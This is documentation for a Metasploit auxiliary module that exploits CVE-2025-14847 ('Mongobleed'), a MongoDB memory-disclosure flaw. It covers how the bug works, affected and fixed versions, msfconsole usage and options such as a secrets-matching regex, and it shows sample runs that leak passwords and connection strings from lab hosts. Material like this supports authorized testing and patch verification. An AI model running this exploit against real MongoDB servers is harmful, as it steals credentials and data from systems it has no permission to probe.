## Vulnerable Application

This module exploits CVE-2025-14847, a memory disclosure vulnerability in MongoDB's zlib decompression handling, commonly referred to as "Mongobleed."

By sending crafted `OP_COMPRESSED` messages with inflated BSON document lengths, the server allocates a buffer based on the claimed uncompressed size but only fills it with the actual decompressed data. When MongoDB parses the BSON document, it reads beyond the decompressed buffer into uninitialized memory, returning leaked memory contents in error messages.

The vulnerability allows unauthenticated remote attackers to leak server memory which may contain sensitive information such as:
- Database credentials
- Session tokens
- Encryption keys
- Connection strings
- Application data

### Vulnerable Versions

Per [MongoDB JIRA SERVER-115508](https://jira.mongodb.org/browse/SERVER-115508):

- MongoDB 3.6.x (all versions - EOL, no fix available)
- MongoDB 4.0.x (all versions - EOL, no fix available)
- MongoDB 4.2.x (all versions - EOL, no fix available)
- MongoDB 4.4.0 through 4.4.29
- MongoDB 5.0.0 through 5.0.31
- MongoDB 6.0.0 through 6.0.26
- MongoDB 7.0.0 through 7.0.27
- MongoDB 8.0.0 through 8.0.16
- MongoDB 8.2.0 through 8.2.2

### Fixed Versions

- MongoDB 4.4.30
- MongoDB 5.0.32
- MongoDB 6.0.27
- MongoDB 7.0.28
- MongoDB 8.0.17
- MongoDB 8.2.3

## Verification Steps

1. Install a vulnerable MongoDB version (e.g., MongoDB 7.0.15)
2. Start the MongoDB service
3. Start msfconsole
4. `use auxiliary/scanner/mongodb/cve_2025_14847_mongobleed`
5. `set RHOSTS <target>`
6. `run`
7. Verify that memory contents are leaked and saved to loot

## Options

### MIN_OFFSET
Minimum BSON document length offset to test. Default: `20`

### MAX_OFFSET
Maximum BSON document length offset to test. Higher values scan more memory but take longer. Default: `8192`

### STEP_SIZE
Offset increment between probes. Higher values are faster but less thorough. Default: `1`

### BUFFER_PADDING
Padding added to the claimed uncompressed buffer size. Default: `500`

### LEAK_THRESHOLD
Minimum bytes to report as an interesting leak in the output. Default: `10`

### QUICK_SCAN
Enable quick scan mode which samples key offsets (power-of-2 boundaries, etc.) instead of scanning every offset. Much faster but may miss some leaks. Default: `false`

### REPEAT
Number of scan passes to perform. Memory contents change over time, so multiple passes can capture more data. Default: `1`

## Advanced Options

### SHOW_ALL_LEAKS
Show all leaked fragments regardless of size. Default: `false`

### SHOW_HEX
Display hexdump of leaked data. Default: `false`

### SECRETS_PATTERN
Regex pattern to detect sensitive data in leaked memory. Default: `password|secret|key|token|admin|AKIA|Bearer|mongodb://|mongo:|conn|auth`

### FORCE_EXPLOIT
Attempt exploitation even if the version check indicates the target is patched. Default: `false`

### PROGRESS_INTERVAL
Show progress every N offsets. Set to 0 to disable. Default: `500`

## Scenarios

### MongoDB 7.0.14 on Linux

```
msf6 > use auxiliary/scanner/mongodb/cve_2025_14847_mongobleed
msf6 auxiliary(scanner/mongodb/cve_2025_14847_mongobleed) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 auxiliary(scanner/mongodb/cve_2025_14847_mongobleed) > run

[*] 192.168.1.100:27017 - MongoDB version: 7.0.14
[+] 192.168.1.100:27017 - Version 7.0.14 is VULNERABLE to CVE-2025-14847
[*] 192.168.1.100:27017 - Scanning 8173 offsets (20-8192, step=1)
[+] 192.168.1.100:27017 - offset=20   len=82  : [conn38248] end connection 10.0.0.5:36845 (0 connections now open)
[+] 192.168.1.100:27017 - offset=163  len=617 : driver: { name: "mongoc / ext-mongodb:PHP ", version: "1.24.3" }
[+] 192.168.1.100:27017 - offset=501  len=40  : id bson type in element with field name
[*] 192.168.1.100:27017 - Progress: 500/8173 (6.1%) - 7 leaks found - ETA: 49s
[+] 192.168.1.100:27017 - offset=757  len=12  : password=abc
[!] 192.168.1.100:27017 - Secret pattern detected at offset 757: 'password' in context: ...config: { password=abc123&user=admin...
[*] 192.168.1.100:27017 - Progress: 1000/8173 (12.2%) - 11 leaks found - ETA: 42s
...

[+] 192.168.1.100:27017 - Total leaked: 1703 bytes
[+] 192.168.1.100:27017 - Unique fragments: 13
[+] 192.168.1.100:27017 - Leaked data saved to: /root/.msf4/loot/20251230_mongobleed.bin

[!] 192.168.1.100:27017 - Potential secrets detected:
[!] 192.168.1.100:27017 -   - Pattern 'password' at offset 757 (pos 12): ...config: { password=abc123&user=admin...
[*] 192.168.1.100:27017 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Multi-Pass Scan for Maximum Data Collection

```
msf6 auxiliary(scanner/mongodb/cve_2025_14847_mongobleed) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/mongodb/cve_2025_14847_mongobleed) > set REPEAT 3
msf6 auxiliary(scanner/mongodb/cve_2025_14847_mongobleed) > set MAX_OFFSET 16384
msf6 auxiliary(scanner/mongodb/cve_2025_14847_mongobleed) > run

[*] 192.168.1.100:27017 - MongoDB version: 7.0.14
[+] 192.168.1.100:27017 - Version 7.0.14 is VULNERABLE to CVE-2025-14847
[*] 192.168.1.100:27017 - Running 3 scan passes to maximize data collection...
[*] 192.168.1.100:27017 - === Pass 1/3 ===
[*] 192.168.1.100:27017 - Scanning 16365 offsets (20-16384, step=1)
...
[*] 192.168.1.100:27017 - Pass 1 complete: 23 new leaks (23 total unique)
[*] 192.168.1.100:27017 - === Pass 2/3 ===
...
[*] 192.168.1.100:27017 - Pass 2 complete: 15 new leaks (38 total unique)
[*] 192.168.1.100:27017 - === Pass 3/3 ===
...
[*] 192.168.1.100:27017 - Pass 3 complete: 8 new leaks (46 total unique)

[+] 192.168.1.100:27017 - Total leaked: 4521 bytes
[+] 192.168.1.100:27017 - Unique fragments: 46
[+] 192.168.1.100:27017 - Leaked data saved to: /root/.msf4/loot/20251230_mongobleed.bin
```

### Quick Scan Mode

```
msf6 auxiliary(scanner/mongodb/cve_2025_14847_mongobleed) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/mongodb/cve_2025_14847_mongobleed) > set QUICK_SCAN true
msf6 auxiliary(scanner/mongodb/cve_2025_14847_mongobleed) > run

[*] 192.168.1.100:27017 - MongoDB version: 7.0.14
[+] 192.168.1.100:27017 - Version 7.0.14 is VULNERABLE to CVE-2025-14847
[*] 192.168.1.100:27017 - Scanning 97 offsets (20-8192, step=1, quick mode)
[+] 192.168.1.100:27017 - offset=20   len=45  : connection string fragment...
[+] 192.168.1.100:27017 - offset=128  len=23  : mongodb://admin:pass...

[+] 192.168.1.100:27017 - Total leaked: 234 bytes
[+] 192.168.1.100:27017 - Unique fragments: 5
[+] 192.168.1.100:27017 - Leaked data saved to: /root/.msf4/loot/20251230_mongobleed.bin
```

## References

- https://www.wiz.io/blog/mongobleed-cve-2025-14847-exploited-in-the-wild-mongodb
- https://jira.mongodb.org/browse/SERVER-115508
- https://www.mongodb.com/docs/manual/reference/mongodb-wire-protocol/
